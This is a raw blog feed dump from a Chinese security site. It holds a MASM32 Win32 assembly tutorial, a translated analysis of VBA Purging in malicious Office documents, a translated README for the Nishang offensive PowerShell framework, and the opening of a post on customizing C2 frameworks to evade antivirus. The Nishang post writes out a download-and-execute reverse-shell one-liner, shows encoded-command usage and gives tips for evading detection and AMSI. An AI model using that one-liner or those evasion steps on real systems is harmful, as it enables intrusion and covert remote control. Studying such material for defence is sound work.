class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat,stdcall</span><br><span class="line">option casemap:none</span><br><span class="line">; Include 文件定义</span><br><span class="line">include windows.inc</span><br><span class="line">include gdi32.inc</span><br><span class="line">includelib gdi32.lib</span><br><span class="line">include user32.inc</span><br><span class="line">includelib user32.lib</span><br><span class="line">include kernel32.inc</span><br><span class="line">includelib kernel32.lib</span><br><span class="line">; 数据段</span><br><span class="line">.data?</span><br><span class="line">hInstance dd ?</span><br><span class="line">hWinMain dd ?</span><br><span class="line">; 常量</span><br><span class="line">.const</span><br><span class="line">szClassName db &#x27;MyClass&#x27;,0</span><br><span class="line">szCaptionMain db &#x27;My first Windows !&#x27;,0</span><br><span class="line">szText db &#x27;Win32 Assembly, Simple and powerful !&#x27;,0</span><br><span class="line">; 代码段</span><br><span class="line">.code</span><br><span class="line">_ProcWinMain proc uses ebx edi esi, hWnd, uMsg, wParam, lParam</span><br><span class="line">    local @stPs:PAINTSTRUCT</span><br><span class="line">    local @stRect:RECT</span><br><span class="line">    local @hDc</span><br><span class="line">            </span><br><span class="line">    mov eax,uMsg</span><br><span class="line">    .if eax == WM_PAINT</span><br><span class="line">        invoke BeginPaint,hWnd,addr @stPs</span><br><span class="line">        mov @hDc,eax</span><br><span class="line">        invoke GetClientRect,hWnd,addr @stRect</span><br><span class="line">        invoke DrawText,@hDc,addr szText,-1, \</span><br><span class="line">            addr @stRect, \</span><br><span class="line">            DT_SINGLELINE or DT_CENTER or DT_VCENTER</span><br><span class="line">        invoke EndPaint,hWnd,addr @stPs</span><br><span class="line">    .elseif eax == WM_CLOSE</span><br><span class="line">        invoke DestroyWindow,hWinMain</span><br><span class="line">        invoke PostQuitMessage,NULL</span><br><span class="line">    .else</span><br><span class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam</span><br><span class="line">        ret</span><br><span class="line">    .endif</span><br><span class="line">    xor eax,eax</span><br><span class="line">    ret</span><br><span class="line">_ProcWinMain endp</span><br><span class="line">_WinMain proc</span><br><span class="line">    local @stWndClass:WNDCLASSEX</span><br><span class="line">    local @stMsg:MSG</span><br><span class="line">    invoke GetModuleHandle,NULL</span><br><span class="line">    mov hInstance,eax</span><br><span class="line">    invoke RtlZeroMemory,addr @stWndClass,sizeof @stWndClass</span><br><span class="line">    invoke LoadCursor,0,IDC_ARROW</span><br><span class="line">    mov @stWndClass.hCursor,eax</span><br><span class="line">    push hInstance</span><br><span class="line">    pop @stWndClass.hInstance</span><br><span class="line">    mov @stWndClass.cbSize,sizeof WNDCLASSEX</span><br><span class="line">    mov @stWndClass.style,CS_HREDRAW or CS_VREDRAW</span><br><span class="line">    mov @stWndClass.lpfnWndProc,offset _ProcWinMain</span><br><span class="line">    mov @stWndClass.hbrBackground,COLOR_WINDOW + 1</span><br><span class="line">    mov @stWndClass.lpszClassName,offset szClassName</span><br><span class="line">    invoke RegisterClassEx,addr @stWndClass</span><br><span class="line">    invoke CreateWindowEx,WS_EX_CLIENTEDGE, \</span><br><span class="line">        offset szClassName,offset szCaptionMain, \</span><br><span class="line">        WS_OVERLAPPEDWINDOW, \</span><br><span class="line">        100,100,600,400, \</span><br><span class="line">        NULL,NULL,hInstance,NULL</span><br><span class="line">    mov hWinMain,eax</span><br><span class="line">    invoke ShowWindow,hWinMain,SW_SHOWNORMAL</span><br><span class="line">    invoke UpdateWindow,hWinMain</span><br><span class="line">    .while TRUE</span><br><span class="line">        invoke GetMessage,addr @stMsg,NULL,0,0</span><br><span class="line">        .break .if eax == 0</span><br><span class="line">        invoke TranslateMessage,addr @stMsg</span><br><span class="line">        invoke DispatchMessage,addr @stMsg</span><br><span class="line">    .endw</span><br><span class="line">    ret</span><br><span class="line">_WinMain endp</span><br><span class="line">start:</span><br><span class="line">    call _WinMain</span><br><span class="line">    invoke ExitProcess,NULL</span><br><span class="line">    end start</span><br></pre></td></tr></table></figure><p>在编译链接前需要做几个设置，首先在项目属性上，在 Microsoft Macro Assembler 中的 Include Paths 选项中，将 MASM32 SDK 安装目录下的 include 路径填在该处，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2021/02/22/3633f7cde11a4e88f2679c7b6270ead5.png" alt=""></p><p>同时将 lib 所在的目录填写在链接器中的附加库目录中，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2021/02/22/b711be4c198d4b6ac4030f660af0cd27.png" alt=""></p><p>上述一切准备就绪，编译链接，一定会失败，为什么，我们来看下出错提示：</p><p><img src="https://image.zeronohacker.com/article/2021/02/22/f52a75123fa2a26e5f7a5d833f44876c.png" alt=""></p><p>其实这个问题当时也困扰了我好久，在这里我来说明下原因，问题出在 MSVC 的版本，过高的 MSVC，masm 不支持，所以只需把 MSVC 降版本号就可以了，如何降，在项目属性页中高级，MSVC 工具集版本，选择低于 14.26 以下即可，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2021/02/22/63b1be46de7de08ca966be24dff78a51.png" alt=""></p><p>如果看不到这些下拉选项，说明你没安装，这时你需要退出 vs2019，打开 vs installer，在单个组件里选择相应 MSVC 版本然后进行修改即可，除了此问题外，还有一个小问题，是语法高亮插件，此插件会提示你找不到相应的 inc 文件，这种你只要把它忽略就可以，因为这是插件的 BUG，目前已有人在插件的 Github 上提了 issue，待作者改善修复。编译链接后如下所示：</p><p><img src="https://image.zeronohacker.com/article/2021/02/22/da99eac04ff00f21528b71e74804d096.png" alt=""></p><p>运行如下所示：</p><p><img src="https://image.zeronohacker.com/article/2021/02/22/f08c78d4669eb16ac20725823a770a71.png" alt=""></p><p>Release 版的仅为 4KB 大。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;p&gt;操作系统：windows 10 2004&lt;/p&gt;
&lt;p&gt;工具：VS2019、MASM32&lt;/p&gt;
&lt;h2 id=&quot;如何编译汇编程序&quot;&gt;&lt;a </summary>
      
    
    
    
    <category term="Assembly" scheme="https://zeronohacker.github.io/categories/Assembly/"/>
    
    
    <category term="Assembly" scheme="https://zeronohacker.github.io/tags/Assembly/"/>
    
    <category term="Win32" scheme="https://zeronohacker.github.io/tags/Win32/"/>
    
  </entry>
  
  <entry>
    <title>使用 VBA Purging 的恶意文档</title>
    <link href="https://zeronohacker.github.io/2020/11/26/evidence-of-vba-purging-found-in-malicious-documents/"/>
    <id>https://zeronohacker.github.io/2020/11/26/evidence-of-vba-purging-found-in-malicious-documents/</id>
    <published>2020-11-26T13:33:01.000Z</published>
    <updated>2021-09-20T13:40:12.192Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文翻译自：<a href="https://blog.nviso.eu/2020/02/25/evidence-of-vba-purging-found-in-malicious-documents/">Evidence of VBA Purging Found in Malicious Documents</a></p></blockquote><p>我们发现在有些恶意 Office 文档中仅包含 VBA 源代码，而没有包含已编译的代码，像这种的可能在逃避反病毒软件检测，我们将这种技术称之为 VBA Purging。</p><h2 id="VBA-Purging-技术"><a href="#VBA-Purging-技术" class="headerlink" title="VBA Purging 技术"></a>VBA Purging 技术</h2><p>恶意 Office 文档将 VBA 代码存储在复合二进制文件流中。每个 VBA 模块，类等都存储在它们自己的模块流中。一个模块流中包含与版本和实现有关的 <strong>PerformanceCache</strong> 数据 (已编译的 VBA 代码，也称 P-Code)，其后是 <strong>CompressedSourceCode</strong> 数据 (已压缩的 VBA 源代码)。</p><p><img src="https://image.zeronohacker.com/article/2020/11/26/a4135b14e697c15b630ea799bb544823.png" alt=""></p><p>在 2016 年，<a href="https://isc.sans.edu/forums/diary/VBA+and+Pcode/21521/">Vesselin Bontchev 提到了一种可以删除/更改压缩的 VBA 源代码并执行 P-Code 的技术</a>。在 2018 年年底，此项技术被称为 VBA Stomping。</p><p>当时的研究表明，还可以删除 PerformanceCache 数据，同时保持完整的 VBA 源代码可以执行，我们将此技术称为 VBA Purging。</p><p>PerformanceCache 数据和 CompressedSourceCode 数据之间由 MODULEOFFSET 定义。MODULEOFFSET 是存储在每个模块流的 dir 流的一条记录。</p><p><img src="https://image.zeronohacker.com/article/2020/11/26/865a50785d9c6d1cda7006418d13b27e.png" alt=""></p><p>要删除 PerformanceCache 数据，必须要删除其字节，以便 CompressedSourceCode 数据从位置 0x0000 (流的开头) 开始。模块流的大小必须相应减少，并且 MODULEOFFSET 记录必须指向 0x0000 位置。</p><p><img src="https://image.zeronohacker.com/article/2020/11/26/a3fdbd4bb26cadb990c16a96f38b6b38.png" alt=""></p><p>PerformanceCache 数据也存在于 _VBA_PROJECT 流和 SRP 流中，这样也意味着 VBA Purging 可从 _VBA_PROJECT 流和 SRP 流中删除 PerformanceCache 数据。</p><h2 id="在野外发现-VBA-Purging"><a href="#在野外发现-VBA-Purging" class="headerlink" title="在野外发现 VBA Purging"></a>在野外发现 VBA Purging</h2><p>多年来，我们遇到过没有 PerformanceCache 数据的 Office 文档，这些文档要么是正常的文档，要么是 PoC 文档。但是在最近，我们发现恶意 Office 文档才是真正的恶意软件 (非 PoC 文档)，比如像 <a href="https://app.any.run/tasks/562fdaea-ea69-47cf-aec9-023a53f700af/">Voo Cancelado Localizador RR9N4V.ppam</a> (MD5 <a href="https://www.virustotal.com/gui/file/20274a55d76a2fbd5f2c0ab727758b21202b22af95f6c0edba01b4b8af060e11/detection">730a8401140edb4c79d563f306ca529e</a>) 这样的文档。此恶意文档有几个有趣的地方，但是对于本博客文章，我们仅关注 VBA Purging 方面。我们找到的文档是 PowerPoint 类型 (.ppam)，这是带有 VBA 宏的 Office Open XML 文件 (OOXML)：</p><p><img src="https://image.zeronohacker.com/article/2020/11/26/536507f3d77cc6bf67db003fd372af1b.png" alt=""></p><p>在这个 zip 压缩文件内，vbaProject.bin 这个文件内包含 VBA 宏代码，这个可以用像 <a href="https://blog.didierstevens.com/programs/oledump-py/">oledump.py</a> 这样的工具来分析它：</p><p><img src="https://image.zeronohacker.com/article/2020/11/26/1045a8d928dc451761c630979cf20f45.png" alt=""></p><p>使用 -i 选项，我们可以看到 MODULEOFFSET 记录的值：</p><p><img src="https://image.zeronohacker.com/article/2020/11/26/fd849a423ecf800b96f8f202d566c94d.png" alt=""></p><p>此选项增加了一个额外的列，其中包含 PerformanceCache 数据和 CompressedSourceCode 数据的大小。在这个样本中，PerformanceCache 数据的大小为 0，表示没有 P-Code，_VBA_PROJECT 流的大小仅为 7 个字节，表示这只是没有 PerformanceCache 数据的头。</p><p><img src="https://image.zeronohacker.com/article/2020/11/26/c1b2c7fb4c47757e6e04a61c613d8aea.png" alt=""></p><p>和一个 “正常” 的恶意文档作比较：</p><p><img src="https://image.zeronohacker.com/article/2020/11/26/72659eb7d7448ffb4ea099362ba992a5.png" alt=""></p><p>此样本中的 VBA 代码下载并执行托管在 GitHub 上的 VBS 脚本：</p><p><img src="https://image.zeronohacker.com/article/2020/11/26/54f5fd350554c16677a364fb47f9d441.png" alt=""></p><h2 id="VBA-Purging-工具"><a href="#VBA-Purging-工具" class="headerlink" title="VBA Purging 工具"></a>VBA Purging 工具</h2><p>有一些工具可以直接创建 Office 文档，而不需要 MS Office 组件，例如使用 .NET 的 EPPlus 库。用这个库可创建没有 PerformanceCache 数据的 Excel 文档。</p><p>VBA 专业开发人员还使用商业工具来清理文档，然后再发布，例如 <a href="https://www.spreadsheet1.com/vba-project-code-cleaner-for-access-excel-powerpoint-word.html">这些</a> <a href="https://www.spreadsheet1.com/vba-project-code-cleaner-for-access-excel-powerpoint-word.html">工具</a>。</p><p>我们不确定该文档使用了什么工具来实现 VBA Purging。当使用 MS Office 创建带有 VBA 代码的文档时，它将包含 PerformanceCache 数据和 CompressedSourceCode 数据。缺少 PerformanceCache 数据意味着该文档是使用其他工具实现的。</p><h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>删除恶意文档的 PerformanceCache 数据能够避免让一些反病毒软件检测出，下面给出一个示例。</p><p>Walmart 红队在演示文稿中使用了恶意文档 a668657023e2c9c12dabad14c8f905e4，它在 VirusTotal (2019 年 12 月 27 日) 上检测结果为 44/61 次：</p><p><img src="https://image.zeronohacker.com/article/2020/11/26/7f726130a155ac11d9d47586233e9de7.png" alt=""></p><p>模块流包含 PerformanceCache 和 CompressedSourceCode 数据。Walmart 红队通过用空字节覆盖 CompressedSourceCode 变量来 “VBA Stomping” 该文档。这导致 VirusTotal 的检测率大大降低 (他们在 2018 年 4 月进行测试时为 7/58 vs 36/59)。</p><p>当我们采用 Walmart 红队的示例删除其中的 PerformanceCache 数据时，我们发现 <a href="https://www.virustotal.com/gui/file/f44e067e011ab13bddf3e3143ea427090ac07c59dcb434d069bcefb4fe3cb434/detection">VirusTotal 的检测率较低</a> (2019 年 12 月 22 日为 16/58)：</p><p><img src="https://image.zeronohacker.com/article/2020/11/26/845634c2be2e9372a91d80c3ce9543b9.png" alt=""></p><p>当然，这只是 VirusTotal 上的一个示例。与在 VirusTotal 上进行AV 扫描静态检测相比，在生产环境操作 AV 时，你的体验可能会大不相同。</p><p>AV 不是唯一会受到 VBA Purging 负面影响。有 IDS 和 YARA 规则依赖于仅在 PerformanceCache 数据中的字符串。例如，通常在恶意 Office 文档的 VBA 源代码中用于创建 ActiveX 对象 (例如 HTTP 对象) 的字符串 CreateObject 仅出现在 PerformanceCache 数据中，它们是通过这些字符串进行判定的。不过它也出现在 VBA 源代码中，由于压缩，它没有作为完整的字符串出现在 CompressedSourceCode 数据中。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p><strong>VBA Purging 从带有 VBA 代码的 Office 文档中删除 PerformanceCache 数据后并不会影响代码执行，但它可能会影响 AV 的检测，并且肯定会影响 IDS 和 YARA 规则的有效性，这些规则仅依赖于 PerformanceCache 数据中的字符串</strong>。如果你使用或制定此类规则，我们建议你重新回顾下本篇文章。</p><p>与 VBA Stomping 不同，VBA Purging 并不是恶意的明显标志。有一些合法的工具可以创建没有 PerformanceCache 数据的文档。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文翻译自：&lt;a href=&quot;https://blog.nviso.eu/2020/02/25/evidence-of-vba-purging-found-in-malicious-documents/&quot;&gt;Evidence of VBA Purgi</summary>
      
    
    
    
    <category term="安全技术" scheme="https://zeronohacker.github.io/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="Office" scheme="https://zeronohacker.github.io/tags/Office/"/>
    
    <category term="VBA Purging" scheme="https://zeronohacker.github.io/tags/VBA-Purging/"/>
    
  </entry>
  
  <entry>
    <title>一款具有攻击性的 Powershell 框架 —— Nishang</title>
    <link href="https://zeronohacker.github.io/2020/11/24/an-offensive-powershell-framework-nishang/"/>
    <id>https://zeronohacker.github.io/2020/11/24/an-offensive-powershell-framework-nishang/</id>
    <published>2020-11-24T13:20:45.000Z</published>
    <updated>2021-09-20T13:30:00.532Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>项目地址：<a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p></blockquote><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/samratashok/nishang"><img src="https://github-readme-stats.vercel.app/api/pin/?username=samratashok&repo=nishang&theme=algolia&show_owner=true"/></a><p>为什么今天会突然会介绍说明下 Nishang 呢，原因是在 VT 中看到了有脚本利用了这个框架，因此，便把它给记录下来</p><p><img src="https://image.zeronohacker.com/article/2020/11/24/989a8a69d9809d6c49357fa4e61fee3d.png" alt=""></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>NiShang 是一个框架，也是一个脚本和 Payloads 的集合，可在攻防、渗透测试和红队联盟中运用。NiShang 尤其是在渗透测试当中非常有用。</p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>在当前 Powershell 会话中导入所有脚本 (适用于 Powershell v3 以后的版本)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\nishang&gt; Import-Module .\nishang.psm1</span><br></pre></td></tr></table></figure><p><code>.</code> 加上源来使用单个脚本文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\nishang&gt; . C:\nishang\Gather\Get-Information.ps1</span><br><span class="line">PS C:\nishang&gt; Get-Information</span><br></pre></td></tr></table></figure><p>获取某个脚本和功能函数的帮助说明</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\nishang&gt; Get-Help [scriptname] -full</span><br></pre></td></tr></table></figure><div class="tip "><p>注意：该帮助说明适用于运行脚本后的加载函数，而不是脚本本身 (0.3.8 版)。在所有情况下，函数名称都与脚本名称相同。</p></div><p>举个粟子，想要知道 <strong>Get-WLAN_Keys.ps1</strong> 的帮助说明，可使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\nishang&gt; . C:\nishang\Get-WLAN-Keys.ps1</span><br><span class="line">PS C:\nishang&gt; Get-Help Get-WLAN-Keys -Full</span><br></pre></td></tr></table></figure><h2 id="反病毒"><a href="#反病毒" class="headerlink" title="反病毒"></a>反病毒</h2><p>许多反病毒软件将 Nishang 脚本标记为恶意。因为运用 Powershell 编写的这些脚本在目标的内存上执行是非常容易的。下面列举了在内存中执行 PowerShell 脚本的两种基本方法</p><span class='p blue'>内存中下载和执行</span><p>使用以下命令从远程 Shell，Meterpreter native shell，Web Shell 等来执行 Powershell 脚本，也能从中导出函数。Nishang 中的所有脚本在当前 Powershell 会话中均导出具有相同名称的函数。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">iex</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://&lt;yourwebserver&gt;/Invoke-PowerShellTcp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> [<span class="type">IP</span>] <span class="literal">-Port</span> [<span class="type">PortNo.</span>]</span><br></pre></td></tr></table></figure><span class='p blue'>使用 Powershell 的 -encodedcommand (或 -e) 参数</span><p>Nishang 中的所有脚本在当前 PowerShell 会话中导出具有相同名称的函数。因此，在 non-Powershell 程序中使用 encodingcommand 参数时，请确保在脚本本身中进行了函数调用。对于上面的示例，添加一个函数调用 (不带引号) <code>&quot;Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]&quot;</code>。</p><p>使用 Invoke-Encode 来编码脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\nishang&gt; . \nishang\Utility\Invoke-Encode</span><br><span class="line">PS C:\nishang&gt; Invoke-Encode -DataToEncode C:\nishang\Shells\Invoke-PowerShellTcp.ps1 -OutCommand</span><br></pre></td></tr></table></figure><p>向 .\encoded.txt 写入编码数据</p><p>向 .\encodedcommand.txt 写入编码命令</p><p>从上面开始，使用来自 encodecommand.txt 的编码脚本，然后在可以执行命令的目标上运行它 (远程 Shell，Meterpreter native shell，Web Shell 等)。像下面这样来使用它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\target&gt; powershell -e [encodedscript]</span><br></pre></td></tr></table></figure><p>如果仍然检测到脚本，则更改功能和参数名称以及删除帮助内容将对你有所帮助。</p><p>如果 Windows 10 的 AMSI 仍然阻止脚本执行，请参见这篇博客文章：<a href="http://www.labofapenetrationtester.com/2016/09/amsi.html">http://www.labofapenetrationtester.com/2016/09/amsi.html</a></p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>目前 NiShang 包含以下脚本和 Payloads</p><p><strong>ActiveDirectory</strong></p><p><a href="https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1">Set-DCShadowPermissions</a> – 修改 AD 对象以提供 DCShadow 所需的最小权限</p><p><strong>Antak – the Webshell</strong></p><p><a href="https://github.com/samratashok/nishang/tree/master/Antak-WebShell">Antak</a> – 使用此 Webshell 在内存中执行 Powershell 脚本，运行命令，下载和上传文件</p><p><strong>Backdoors</strong></p><p><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/HTTP-Backdoor.ps1">HTTP-Backdoor</a> – 后门可以接收来自第三方网站的指令并在内存中执行 Powershell 脚本</p><p><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/DNS_TXT_Pwnage.ps1">DNS_TXT_Pwnage</a> – 后门可以从 DNS TXT 查询接收命令和 PowerShell 脚本，并在目标上执行它们，可以使用查询进行远程控制</p><p><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Execute-OnTime.ps1">Execute-OnTime</a> – 可以在给定时间上对目标执行 PowerShell 脚本后门</p><p><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Gupt-Backdoor.ps1">Gupt-Backdoor</a> – 后门无需连接即可从 WLAN SSID 接收命令和脚本</p><p><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Add-ScrnSaveBackdoor.ps1">Add-ScrnSaveBackdoor</a> – 可以使用 Windows 屏幕保护程序执行远程命令和脚本后门</p><p><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Invoke-ADSBackdoor.ps1">Invoke-ADSBackdoor</a> – 可以使用备用数据流和 Windows 注册表实现持久性后门</p><p><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Add-RegBackdoor.ps1">Add-RegBackdoor</a> – Debugger 后门程序，可以使用 Sticky 键和 Utilman (Windows 键 + U) 执行 Payload</p><p><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemotePSRemoting.ps1">Set-RemotePSRemoting</a> – 修改 DCOM 和 WMI 名称空间的权限，以允许非管理员用户访问</p><p><strong>Bypass</strong></p><p><a href="https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1">Invoke-AmsiBypass</a> – 实施绕过 AMSI 的方法</p><p><strong>Client</strong></p><p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1">Out-CHM</a> – 创建可以执行 PowerShell 命令和脚本的受感染 CHM 文件</p><p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-Word.ps1">Out-Word</a> – 创建 Word 文件并感染现有文件以运行 Powershell命令和脚本</p><p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-Excel.ps1">Out-Excel</a> – 创建 Excel 文件并感染现有文件以运行 Powershell 命令和脚本</p><p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-HTA.ps1">Out-HTA</a> – 创建一个 HTA 文件，该文件可以部署在 Web 服务器上并用于网络钓鱼活动</p><p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-Java.ps1">Out-Java</a> – 创建签名的 JAR 文件，该文件可以与 applet 一起用于脚本和命令执行</p><p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-Shortcut.ps1">Out-Shortcut</a> – 创建能够执行 Powershell 命令和脚本的快捷方式文件</p><p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-WebQuery.ps1">Out-WebQuery</a> – 创建网络钓鱼凭据和 SMB 哈希的 IQY 文件</p><p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-JS.ps1">Out-JS</a> – 创建能够执行 Powershell 命令和 Powershell 脚本的 JS 文件</p><p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-SCT.ps1">Out-SCT</a> – 创建能够执行 Powershell 命令和 Powershell 脚本的 SCT 文件</p><p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-SCF.ps1">Out-SCF</a> – 创建一个 SCF 文件，该文件可用于捕获 NTLM hash challenges</p><p><strong>Escalation</strong></p><p><a href="https://github.com/samratashok/nishang/blob/master/Escalation/Enable-DuplicateToken.ps1">Enable-DuplicateToken</a> – 当需要 SYSTEM 特权时</p><p><a href="https://github.com/samratashok/nishang/blob/master/Escalation/Remove-Update.ps1">Remove-Update</a> – 通过移除补丁来介绍漏洞</p><p><a href="https://github.com/samratashok/nishang/blob/master/Escalation/Invoke-PsUACme.ps1">Invoke-PsUACme</a> – 绕过 UAC</p><p><strong>Execution</strong></p><p><a href="https://github.com/samratashok/nishang/blob/master/Execution/Download-Execute-PS.ps1">Download-Execute-PS</a> – 下载并执行内存中的 Powershell 脚本</p><p><a href="https://github.com/samratashok/nishang/blob/master/Execution/Download_Execute.ps1">Download_Execute</a> – 下载文本格式的可执行文件，将其转换为可执行文件，然后执行</p><p><a href="https://github.com/samratashok/nishang/blob/master/Execution/Execute-Command-MSSQL.ps1">Execute-Command-MSSQL</a> – 以足够的权限在 MSSQL Server 上运行 PowerShell 命令，native 命令或 SQL 命令</p><p><a href="https://github.com/samratashok/nishang/blob/master/Execution/Execute-DNSTXT-Code.ps1">Execute-DNSTXT-Code</a> – 使用 DNS TXT 查询在内存中执行 shellcode</p><p><a href="https://github.com/samratashok/nishang/blob/master/Execution/Out-RundllCommand.ps1">Out-RundllCommand</a> – 使用 rundll32.exe 执行 Powershell 命令和 Powershell 脚本或反向 Powershell 会话</p><p><strong>Gather</strong></p><p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Check-VM.ps1">Check-VM</a> – 检查虚拟机</p><p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1">Copy-VSS</a> – 使用卷影拷贝服务拷贝 SAM 文件</p><p>……</p><p>更多脚本可在项目中查看，在这不一一列举，因为实在太多了！</p><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>关于 Nishang 的更新可关注这个博客：<a href="http://labofapenetrationtester.com/">http://labofape</a><a href="http://labofapenetrationtester.com/">netrationtester.com</a> 或者是关注我的推特 @nikhil_mitt。</p><h2 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h2><p>以下的一些博客文章会对初学者有帮助：</p><ul><li><a href="http://www.labofapenetrationtester.com/2014/06/nishang-0-3-4.html">http://www.labofapenetrationtester.com/2014/06/nishang-0-3-4.html</a></li><li><a href="http://labofapenetrationtester.com/2012/08/introducing-nishang-powereshell-for.html">http://labofapenetrationtester.com/2012/08/introducing-nishang-powereshell-for.html</a></li><li><a href="http://labofapenetrationtester.com/2013/08/powerpreter-and-nishang-Part-1.html">http://labofapenetrationtester.com/2013/08/powerpreter-and-nishang-Part-1.html</a></li><li><a href="http://www.labofapenetrationtester.com/2013/09/powerpreter-and-nishang-Part-2.html">http://www.labofapenetrationtester.com/2013/09/powerpreter-and-nishang-Part-2.html</a></li></ul><p>所有关于 Nishang 的文章：</p><ul><li><a href="http://www.labofapenetrationtester.com/search/label/Nishang">http://www.labofapenetrationtester.com/search/label/Nishang</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/samratashok/nishang&quot;&gt;https://github.com/samratashok/nishang&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;a class=</summary>
      
    
    
    
    <category term="工具源码" scheme="https://zeronohacker.github.io/categories/%E5%B7%A5%E5%85%B7%E6%BA%90%E7%A0%81/"/>
    
    
    <category term="Nashang" scheme="https://zeronohacker.github.io/tags/Nashang/"/>
    
    <category term="PowerShell" scheme="https://zeronohacker.github.io/tags/PowerShell/"/>
    
  </entry>
  
  <entry>
    <title>自定义 C2-Frameworks 来逃避 AV 检测</title>
    <link href="https://zeronohacker.github.io/2020/11/23/customizing-c2-frameworks-for-av-evasion/"/>
    <id>https://zeronohacker.github.io/2020/11/23/customizing-c2-frameworks-for-av-evasion/</id>
    <published>2020-11-23T12:45:19.000Z</published>
    <updated>2021-09-20T13:18:19.213Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本篇文章翻译自：<a href="https://s3cur3th1ssh1t.github.io/Customizing_C2_Frameworks/">Customizing C2-Frameworks for AV-Evasion</a></p></blockquote><p>这篇文章将会给大家阐述如何通过修改后的 Command &amp; Control (C2) Frameworks 来逃避 AV 检测。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在过去的几周，我参与了 <a href="https://www.zeropointsecurity.co.uk/red-team-ops">红队队员的培训课程</a>，在课程当中使用了基于 C2-Framework 的 Covenant，我从中获取到了一些经验。当开始学习这门课程时，并没有关于逃避 AV 检测和 C2-Customization 的说明，所以自己用 <a href="https://github.com/cobbr/Covenant">Covenant</a> 做了关于这方面的内容，同时增加了 逃避 AV 检测，Rastamouse <a href="https://offensivedefence.co.uk/posts/covenant-profiles-templates/">在此</a> 发布了关于此内容的一部分。</p><div class="tip "><p>提示：Covenant 是一个具有攻击性的 .NET 命令和控制框架，可充当为红队队员协作命令和控制平台。</p></div><p>在这篇博客文章中，我将介绍如何通过更改 C2-Frameworks 源代码的方法来逃避 AV 检测。应当明确的是，由于我的方法是公开的，因此我的方法将在不久的将来会 <strong>get flagged</strong>，因此，我建议在这之后再创建你自己的项目。</p><p><strong>注：关于 get flagged 的说明 -&gt; <a href="https://www.bilibili.com/video/av712735770/">https://www.bilibili.com/video/av712735770/</a></strong></p><p>第一部分将介绍 